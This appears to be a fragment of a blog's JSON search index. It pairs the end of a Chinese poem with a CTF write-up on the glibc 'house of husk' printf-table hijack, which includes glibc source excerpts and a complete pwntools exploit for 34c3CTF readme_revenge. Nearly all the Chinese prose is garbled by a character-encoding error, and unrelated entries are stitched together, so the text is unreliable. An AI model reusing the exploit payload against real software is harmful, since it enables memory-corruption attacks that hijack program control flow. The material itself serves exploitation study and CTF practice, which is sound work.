æ¢¦é†’æ—¶åˆ†çš„è¿·æƒ˜å†·äº†æˆ‘çƒ­è¡€ä¸€è…”\næˆ‘å°šå¹´è½»ï¼Œå´ä¹Ÿåœ¨å¹´é•¿ é˜…å†å‡é¦™äº¦éš¾æŒ¡æ„ç»ªå¿§ä¼¤ æµ®æµ®æ²‰æ²‰ï¼Œæ…Œæ…Œå¼ å¼  æ®‹å­˜çš„ç‚½å¿ƒè¿«ä½¿æˆ‘ç‡ƒåŒ–å‡éœœ è§¦ä¸å¯åŠçš„ç†æƒ³å’Œç™½å‘çš„é«˜å ‚ ååå¤å¤ï¼Œè·Œè·Œè¡è¡ å’€åš¼ç€è‰°éš¾è‹¦æ¨ä¸ä¸–ç•Œå’Œè‡ªæˆ‘å¯¹æŠ—\n2025.10 -å±± ","date":"2025-09-10T23:34:28+08:00","image":"http://localhost:1313/image/%E8%BF%B7%E9%80%9437.jpg","permalink":"http://localhost:1313/p/%E8%BF%B7%E9%80%94/","title":"è¿·é€”"},{"content":" https://xz.aliyun.com/news/14821\nhttps://zikh26.github.io/posts/6c83c2a2.html\n**ä»‹ç»ï¼š**house of huskæ˜¯å¯¹printfå‡½æ•°å†…éƒ¨è¿›è¡Œæ³¨å†Œè‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°çš„æŒ‡é’ˆè¿›è¡ŒåŠ«æŒï¼Œglibc 2.23-2.35è¯¥æ‰‹æ³•å‡å¯ç”¨\nåŸç† æ‰§è¡Œprintfå‡½æ•°æ—¶ï¼Œ__printf_function_table æ˜¯å¦ä¸ºç©ºï¼Œæ¥åˆ¤æ–­æ˜¯å¦æœ‰è‡ªå®šä¹‰çš„æ ¼å¼åŒ–å­—ç¬¦ï¼Œå¦‚æœåˆ¤å®šä¸ºæœ‰çš„è¯ï¼Œåˆ™ä¼šå»æ‰§è¡Œ __printf_arginfo_table[spec] å¤„çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨è¿™æœŸé—´å¹¶æ²¡æœ‰è¿›è¡Œä»»ä½•åœ°å€çš„åˆæ³•æ€§æ£€æŸ¥\né‚£æˆ‘ä»¬å¦‚æœåŠ«æŒ**__printf_function_tableéç©ºï¼Œ**åŠ«æŒ __printf_arginfo_table ä½¿å…¶è¡¨ä¸­å­˜æ”¾çš„ spec çš„ä½ç½®æ˜¯ backdoor()ï¼Œåœ¨æ‰§è¡Œprintfå‡½æ•°æ—¶å°±å¯ä»¥åŠ«æŒç¨‹åºæ‰§è¡Œæµåˆ°backdoor()\nåˆ©ç”¨æ–¹æ³• __printf_function_table å’Œ__printf_arginfo_table åˆ†åˆ«å†™ä¸º chunk A å’Œ chunk B çš„åœ°å€ è®¾å ä½ç¬¦ä¸º Î±ï¼Œæ­¤æ—¶ chunk B çš„å†…å®¹åº”è¯¥ä¸º p64(0) x ord(Î±-2) + p64(one_gadget) specæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚æœ€åè°ƒç”¨çš„æ˜¯printf(\u0026quot;%X\\n\u0026quot;,a)é‚£ä¹ˆåº”è¯¥å°†__printf_arginfo_table[88]çš„ä½ç½®å†™å…¥backdoor(),å…¶ä¸­88æ˜¯ord(\u0026lsquo;X\u0026rsquo;)\nè¯¥æŠ€å·§ä¸€èˆ¬å’Œ largebin attackæˆ–unsortedbin attack ç»“åˆèµ·æ¥ è¿˜å¯ä»¥ä½¿ç”¨relative overwrite è¿˜æœ‰ä¸€ä¸ª__printf_va_arg_table ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯æ¡ä»¶æ¯”è¾ƒè‹›åˆ» Relative overwrite 1é¦–å…ˆåˆ©ç”¨largebin attackæˆ–unsortedbin attackä¿®æ”¹gloabl_max_fast(å®šä¹‰äº† fastbin èƒ½å¤Ÿå¤„ç†çš„ chunk æœ€å¤§å¤§å°)\nfastbinsYæ•°ç»„ä½äºmain_areaä¸­ï¼Œå½“freeä¸€ä¸ªchunkæ—¶ï¼Œä¼šå‘fastbinsYæ•°ç»„ä¸­å†™å…¥åœ°å€\n2å¦‚æœä¿®æ”¹äº†gloabl_max_fastï¼Œé‡Šæ”¾æ˜¯ä¸ªå¤§chunkæ—¶å°±ä¼šé€ æˆæ•°ç»„è¶Šç•Œä»è€Œå‘ä¸¤ä¸ªtableä¸­å†™å…¥å †åœ°å€\næºç è§£æ é“¾æ¡ä¸ºä¸‹é¢äº”ä¸ªéƒ¨åˆ†\nprintf-\u0026gt;vfprintf\nvfprintf-\u0026gt;do_positional\ndo_positional-\u0026gt;printf_positional\nprintf_positional-\u0026gt;__parse_one_specmb(è¯¥å‡½æ•°æ‰§è¡Œè‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆ)\n__parse_one_specmb-\u0026gt;anyaddr\n__register_printf_functionå‡½æ•° æ ¼å¼åŒ–å­—ç¬¦çš„æ³¨å†Œå‡½æ•°,å®é™…ä¸Šæ˜¯__register_printf_specifierå‡½æ•°çš„å°è£…\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /* Register FUNC to be called to format SPEC specifiers. */ int __register_printf_specifier (int spec, printf_function converter, printf_arginfo_size_function arginfo) { if (spec \u0026lt; 0 || spec \u0026gt; (int) UCHAR_MAX) #UCHAR_MAX=0xff { __set_errno (EINVAL); return -1; } int result = 0; __libc_lock_lock (lock); if (__printf_function_table == NULL) { __printf_arginfo_table = (printf_arginfo_size_function **) calloc (UCHAR_MAX + 1, sizeof (void *) * 2); if (__printf_arginfo_table == NULL) { result = -1; goto out; } __printf_function_table = (printf_function **) (__printf_arginfo_table + UCHAR_MAX + 1); } __printf_function_table[spec] = converter; __printf_arginfo_table[spec] = arginfo; out: __libc_lock_unlock (lock); return result; } å…ˆåšäº†ä¸€ä¸ªåˆ¤æ–­ åˆ¤æ–­specæ˜¯å¦å­˜åœ¨ascilç ï¼Œå†åˆ¤æ–­printf_function_table == NULL å°±è®¾å®šä¸€ä¸ªcallocæ¥åˆ†é…ä¸¤ä¸ªç´¢å¼•è¡¨ï¼Œå¹¶å°†åœ°å€å­˜æ”¾åˆ° __printf_function_tableå’Œ __printf_arginfo_tableä¸­ï¼Œä¸¤ä¸ªè¡¨å¤§å°éƒ½æ˜¯0x100å¯ä»¥ç»™0x0-0xffæ¯ä¸ªå­—ç¬¦æ³¨å†Œä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ\nprintf-\u0026gt;vfprintf 1 2 3 4 5 6 7 8 9 10 11 12 int __printf (const char *format, ...) { va_list arg; int done; va_start (arg, format); done = vfprintf (stdout, format, arg); va_end (arg); return done; } vfprintf-\u0026gt;do_positional 1 2 3 4 5 /* Use the slow path in case any printf handler is registered. */ if (__glibc_unlikely (__printf_function_table != NULL || __printf_modifier_table != NULL || __printf_va_arg_table != NULL)) goto do_positional; è¿™é‡Œæ£€æŸ¥ä¸‰ä¸ªtableï¼Œåªè¦æœ‰ä¸€ä¸ªéç©ºå°±æ‰§è¡Œdo_positional\né€šå¸¸åŠ«æŒçš„æ˜¯__printf_function_table\ndo_positional-\u0026gt;printf_positional 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 if (__glibc_unlikely (__printf_function_table != NULL || __printf_modifier_table != NULL || __printf_va_arg_table != NULL)) goto do_positional; ...... do_positional: if (__glibc_unlikely (workstart != NULL)) { free (workstart); workstart = NULL; } done = printf_positional (s, format, readonly_format, ap, \u0026amp;ap_save, done, nspecs_done, lead_str_end, work_buffer, save_errno, grouping, thousands_sep); è°ƒç”¨äº†printf_positionalå‡½æ•°\nprintf_positional-\u0026gt;__parse_one_specmb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 printf_positional (_IO_FILE *s, const CHAR_T *format, int readonly_format, va_list ap, va_list *ap_savep, int done, int nspecs_done, const UCHAR_T *lead_str_end, CHAR_T *work_buffer, int save_errno, const char *grouping, THOUSANDS_SEP_T thousands_sep) { --------------------------------------- /* Parse the format specifier. */ #ifdef COMPILE_WPRINTF nargs += __parse_one_specwc (f, nargs, \u0026amp;specs[nspecs], \u0026amp;max_ref_arg); #else nargs += __parse_one_specmb (f, nargs, \u0026amp;specs[nspecs], \u0026amp;max_ref_arg); #endif//è°ƒç”¨__parse_one_specmb } /* Determine the number of arguments the format string consumes. */ nargs = MAX (nargs, max_ref_arg); __parse_one_specmb-\u0026gt;anyaddr 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #ifdef COMPILE_WPRINTF __parse_one_specwc (const UCHAR_T *format, size_t posn, struct printf_spec *spec, size_t *max_ref_arg) #else __parse_one_specmb (const UCHAR_T *format, size_t posn, struct printf_spec *spec, size_t *max_ref_arg) #endif { unsigned int n; size_t nargs = 0; /* Skip the \u0026#39;%\u0026#39;. */ ++format; -----------------------------------å…³é”®ä»£ç  if (__builtin_expect (__printf_modifier_table == NULL, 1) || __printf_modifier_table[*format] == NULL || HANDLE_REGISTERED_MODIFIER (\u0026amp;format, \u0026amp;spec-\u0026gt;info) != 0) ... if (__builtin_expect (__printf_function_table == NULL, 1) || spec-\u0026gt;info.spec \u0026gt; UCHAR_MAX || __printf_arginfo_table[spec-\u0026gt;info.spec] == NULL /* We don\u0026#39;t try to get the types for all arguments if the format uses more than one. The normal case is covered though. If the call returns -1 we continue with the normal specifiers. */ || (int) (spec-\u0026gt;ndata_args = (*__printf_arginfo_table[spec-\u0026gt;info.spec]) (\u0026amp;spec-\u0026gt;info, 1, \u0026amp;spec-\u0026gt;data_arg_type, \u0026amp;spec-\u0026gt;size)) \u0026lt; 0) 34c3CTF readme_revenge 1 2 3 4 5 6 7 8 9 10 11 int __fastcall main(int argc, const char **argv, const char **envp) { int v3; // edx int v4; // ecx int v5; // r8d int v6; // r9d _isoc99_scanf((unsigned int)\u0026amp;I010s, (unsigned int)\u0026amp;name, (_DWORD)envp); printf((unsigned int)\u0026#34;Hi, %s. Bye.\\n\u0026#34;, (unsigned int)\u0026amp;name, v3, v4, v5, v6); return 0; } ç¨‹åºæ˜¯é™æ€ç¼–è¯‘çš„ï¼Œflagç›´æ¥å‚¨å­˜åœ¨dataæ®µ,ä¸”house_of_huskç›¸å…³çš„ä¿©ä¸ªtableåœ°å€å‡æ¯”nameé«˜ï¼Œå¯ä»¥ä¿®æ”¹__printf_function_tableéç©ºï¼Œ__printf_arginfo_tableä¸ºä»»æ„åœ°å€Aæ»¡è¶³*(A+8*0x73)=_stack_chk_fail_localåœ°å€\næœ€åæŠŠ__libc_argv[0]åœ°å€æ”¹ä¸ºflagåœ°å€\n1 2 è°ƒç”¨_stack_chk_fail_localæ—¶ ä¼šæ‰“å°å‡º __libc_argv[0] æŒ‡å‘çš„å­—ç¬¦ä¸² è¯¥é¢˜ä¸­ __libc_argv[0]åœ°å€ä¹Ÿæ¯”nameé«˜ åªä¿®æ”¹ä¸Šè¿°ä¸¤ä¸ªtableä¼šè§¦å‘__parse_one_specmbä¸­çš„ä¸‹é¢ä»£ç \n1 2 3 if (__builtin_expect (__printf_modifier_table == NULL, 1) || __printf_modifier_table[*format] == NULL || HANDLE_REGISTERED_MODIFIER (\u0026amp;format, \u0026amp;spec-\u0026gt;info) != 0) éœ€è¦æ§åˆ¶__printf_modifier_tableä¸ºç©ºï¼Œ__printf_modifier_tableåœ°å€ä¸º__printf_function_tableåœ°å€+8\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from pwn import* context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p=process(\u0026#39;./pwn\u0026#39;) #%s is 0x73 arg_table=0x6b7aa8 #distance fun_table 0x80 fun_table=0x6b7a28#distance 0x648 name=0x6B73E0 flag=0x6b4040 #__printf_modifier_table ä½äº __printf_function_table åœ°å€åŠ  8 çš„ä½ç½® libc_argv=0x6b7980 #distance 0x5a0 #__stack_chk_fail_local leak=0x4359B0 pay=p64(flag)+b\u0026#39;a\u0026#39;*0x598 pay+=p64(name)#libc_argv[0] pay+=b\u0026#39;a\u0026#39;*(0x648-0x5a0-8)+p64(0xdeadbeef)#fun_table pay+=p64(0)#__printf_modifier_table pay+=b\u0026#39;a\u0026#39;*0x70 pay+=p64(arg_table) pay+=p64(0)*0x72+p64(leak) gdb.attach(p,\u0026#39;b *0x400A5C\u0026#39;) p.sendline(pay) p.interactive() ","date":"0001-01-01T00:00:00Z","permalink":"http://localhost:1313/p/","title":""}]